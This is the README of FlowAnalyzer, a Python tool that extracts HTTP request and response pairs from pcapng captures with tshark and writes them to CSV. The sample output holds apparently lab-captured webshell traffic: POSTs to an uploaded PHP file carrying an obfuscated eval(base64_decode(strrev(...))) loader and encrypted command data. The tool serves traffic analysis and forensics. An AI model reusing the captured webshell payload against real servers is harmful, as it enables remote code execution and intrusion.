# FlowAnalyzer

# Usage

请务必添加 `tshark.exe` 到环境变量，否则找不到会出错！


```python
import os
import csv
import datetime
from FlowAnalyzer import FlowAnalyzer

baseDir = os.path.dirname(os.path.abspath(__file__))
flowPath = os.path.join(baseDir, "flow.pcapng")
display_filter = "(http.request and urlencoded-form) or (http.request and data-text-lines) or (http.request and mime_multipart) or (http.response.code == 200 and data-text-lines)"

jsonPath = FlowAnalyzer.get_json_data(flowPath, display_filter=display_filter)
rows = []
title = ['number','src_ip','src_port','dst_ip','dst_port','request_time','request_method','request_full_uri','request_header','request_body','response_time','response_code','response_header','response_body']
rows.append(title)
for http_seq_num, http in enumerate(FlowAnalyzer(jsonPath).generate_http_dict_pairs(), start=1):
    request, response = http.request, http.response
    row = []
    if request:
        row += [request.number,request.src_ip,request.src_port,request.dst_ip,request.dst_port,datetime.datetime.fromtimestamp(request.time_epoch).strftime('%Y-%m-%d %H:%M:%S'),request.method,request.full_uri,request.header,request.body]
    else:
        row += [None] * 10
    if response:
        row += [datetime.datetime.fromtimestamp(response.time_epoch).strftime('%Y-%m-%d %H:%M:%S'),response.status_code,response.header, response.body]
    else:
        row += [None] * 4
    rows.append(row)

with open('result.csv', 'a', newline='',encoding='utf8') as csvfile:
    csvwriter = csv.writer(csvfile, dialect='excel')
    csvwriter.writerows(rows)

```

```
number,src_ip,src_port,dst_ip,dst_port,request_time,request_method,request_full_uri,request_header,request_body,response_time,response_code,response_header,response_body
2,192.168.225.1,8899,192.168.225.129,80,2023-04-27 19:51:02,POST,http://192.168.225.129/upload/php_eval_xor_base64.php,"b'POST /upload/php_eval_xor_base64.php HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\r\nCookie: PHPSESSID=s9ocgt7via0goppc2f8ev033e3;\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\nHost: 192.168.225.129\r\nConnection: keep-alive\r\nContent-type: application/x-www-form-urlencoded\r\nContent-Length: 1403\r\n\r\n'",b'pass=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&key=fL1tMGI4YTljMX78f8Wo%2FyhTF1YCWEn3M%2BF4ZGJ%2BL2Iz5EofTe8udar8%2BTGDwKtg8LxWYhFKlauQQtYfPnQDdprPQMrHPVjA6hjPeOQNpHlpcBNa5IHIHHrIHEy7jch%2Fv3Z2Y0lq8qSQQkYhwWZhxVpNq1liOGE%3D',2023-04-27 19:51:02,200,"b'HTTP/1.1 200 OK\r\nServer: openresty/1.15.8.1\r\nDate: Thu, 27 Apr 2023 11:51:02 GMT\r\nContent-Type: text/html\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\nX-Powered-By: PHP/5.5.38\r\nSet-Cookie: PHPSESSID=s9ocgt7via0goppc2f8ev033e3; path=/\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache\r\n\r\n'",b'72a9c691ccdaab98fL1tMGI4YTljMh76GrwuHij67J+qF+t2KR17BwHlSvtL1mdSPnoksIZRS0N0Xi89+zNlNaUo+3xjMTU=b4c4e1f6ddd2a488'
5,192.168.225.1,8899,192.168.225.129,80,2023-04-27 19:51:06,POST,http://192.168.225.129/upload/php_eval_xor_base64.php,"b'POST /upload/php_eval_xor_base64.php HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\r\nCookie: PHPSESSID=s9ocgt7via0goppc2f8ev033e3;\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\nHost: 192.168.225.129\r\nConnection: keep-alive\r\nContent-type: application/x-www-form-urlencoded\r\nContent-Length: 1409\r\n\r\n'",b'pass=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&key=fL1tMGI4YTljMX78f8Wo%2FyhTF1cCWEn3M%2BF4ZGJ%2BL2Iz5EofTe8udar8%2BTGDwKtg8LxWYhFKlauQQtYfPnQDdprPQMrHPVjA6hjPeOTReMrqj%2Fx6aH4XU%2BWInBcrzUhN6o%2FMfL54MmpIY6avwUcSIJBkZUuq7rVUYzE1',2023-04-27 19:51:06,200,"b'HTTP/1.1 200 OK\r\nServer: openresty/1.15.8.1\r\nDate: Thu, 27 Apr 2023 11:51:06 GMT\r\nContent-Type: text/html\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\nX-Powered-By: PHP/5.5.38\r\nSet-Cookie: PHPSESSID=s9ocgt7via0goppc2f8ev033e3; path=/\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache\r\n\r\n'",b'72a9c691ccdaab98fL1tMGI4YTljMh4dHdNjM6AJ3DZmOGE5b4c4e1f6ddd2a488'
8,192.168.225.1,8927,192.168.225.129,80,2023-04-27 19:51:48,POST,http://192.168.225.129/upload/php_eval_xor_base64.php,"b'POST /upload/php_eval_xor_base64.php HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\r\nCookie: PHPSESSID=s9ocgt7via0goppc2f8ev033e3;\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\nHost: 192.168.225.129\r\nConnection: keep-alive\r\nContent-type: application/x-www-form-urlencoded\r\nContent-Length: 1427\r\n\r\n'",b'pass=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&key=fL1tMGI4YTljMX78f8Wo%2FyhTL1ACWEn3M%2BF4ZGJ%2BL2Iz5EofTe8udar8%2BTGDwKtg8LxWYhFKlauQQtYfPnQDdprPQMrHPVjA6hjPeOSdqCqaPC9ZW7GI7C2kIPd0MqlXzqT3svOl%2B1gNW3x0TL4%2BUQ0cdgeygrWzt1XSzu7opY93Nvl1tILnOWMx',2023-04-27 19:51:48,200,"b'HTTP/1.1 200 OK\r\nServer: openresty/1.15.8.1\r\nDate: Thu, 27 Apr 2023 11:51:48 GMT\r\nContent-Type: text/html\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\nX-Powered-By: PHP/5.5.38\r\nSet-Cookie: PHPSESSID=s9ocgt7via0goppc2f8ev033e3; path=/\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache\r\n\r\n'",b'72a9c691ccdaab98fL1tMGI4YTljMn75e3jORcmaTQZQeEdS2jE3TKPMeDNjNg==b4c4e1f6ddd2a488'

```

# Contributing
Feel free to submit issues or pull requests if you have any suggestions, improvements, or bug reports.

# License

This project is licensed under the [MIT License.](LICENSE)
